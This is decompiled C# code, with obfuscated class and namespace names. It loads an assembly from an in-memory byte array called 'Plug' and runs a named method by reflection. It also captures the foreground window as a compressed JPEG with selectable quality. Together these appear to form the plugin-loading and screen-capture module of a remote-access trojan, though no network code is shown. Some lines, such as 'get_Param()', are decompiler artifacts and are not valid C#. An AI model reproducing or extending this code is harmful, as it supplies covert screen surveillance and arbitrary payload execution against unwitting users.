using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace n;

public class C
{
	public struct RECT
	{
		public int left;

		public int top;

		public int right;

		public int bottom;
	}

	public static byte[] Plug;

	public static object inv(ref byte[] F, ref string C, ref string S, ref object P)
	{
		Assembly assembly = Assembly.Load(F);
		MethodInfo method = assembly.GetType(C)!.GetMethod(S);
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(assembly.GetType(C)));
		return method.Invoke(RuntimeHelpers.GetObjectValue(objectValue), (object[])P);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

	public static byte[] Capture1(ref int q, ref int HWD)
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		if (HWD == 0)
		{
			HWD = API.GetForegroundWindow().ToInt32();
		}
		if (HWD == 0)
		{
			MemoryStream memoryStream = new MemoryStream(sc.gc(ref q));
			return memoryStream.ToArray();
		}
		RECT lpRect = default(RECT);
		GetWindowRect((IntPtr)HWD, ref lpRect);
		checked
		{
			int num = lpRect.bottom - lpRect.top;
			if (num < 0)
			{
				num = 1;
			}
			int num2 = lpRect.right - lpRect.left;
			if (num2 < 0)
			{
				num2 = 1;
			}
			Bitmap val = new Bitmap(num2, num);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			IntPtr hdc = val2.GetHdc();
			PrintWindow((IntPtr)HWD, hdc, 0u);
			val2.ReleaseHdc(hdc);
			val2.Dispose();
			int num3 = default(int);
			switch (q)
			{
			case 0:
				num3 = 80;
				break;
			case 1:
				num3 = 70;
				break;
			case 2:
				num3 = 65;
				break;
			case 3:
				num3 = 50;
				break;
			case 4:
				num3 = 45;
				break;
			case 5:
				num3 = 40;
				break;
			case 6:
				num3 = 35;
				break;
			case 7:
				num3 = 30;
				break;
			case 8:
				num3 = 25;
				break;
			case 9:
				num3 = 20;
				break;
			case 10:
				num3 = 10;
				break;
			}
			EncoderParameters val3 = new EncoderParameters(1);
			val3.get_Param()[0] = new EncoderParameter(Encoder.Quality, unchecked((long)num3));
			ImageCodecInfo encoderInfo = sc.GetEncoderInfo("image/jpeg");
			MemoryStream memoryStream2 = new MemoryStream();
			IntPtr intPtr = default(IntPtr);
			((Image)val).GetThumbnailImage((int)Math.Round((double)num2 / 1.4), (int)Math.Round((double)num / 1.4), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream2, encoderInfo, val3);
			((Image)val).Dispose();
			return memoryStream2.ToArray();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetWindowDC(IntPtr hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowRect(IntPtr hwnd, ref RECT lpRect);
}
